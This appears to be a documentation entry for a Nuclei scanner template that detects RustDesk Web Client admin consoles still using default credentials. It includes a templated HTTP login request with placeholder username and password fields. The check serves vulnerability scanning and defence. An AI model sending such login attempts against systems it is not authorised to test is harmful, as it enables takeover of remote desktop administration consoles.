# Nuclei Template: RustDesk Web Client - Default login
**Template ID:** rustdesk-webclient-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`rustdesk-webclient-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected RustDesk Web Client Admin Console was using default credentials.

## Steps to reproduce / Exploit Payload
```http
POST /api/admin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}","platform":"windows","captcha":"","captcha_id":""}
```

## References
- https://rustdesk.com/docs/en/self-host/rustdesk-server-pro/console/
- https://github.com/rustdesk/rustdesk-server-pro
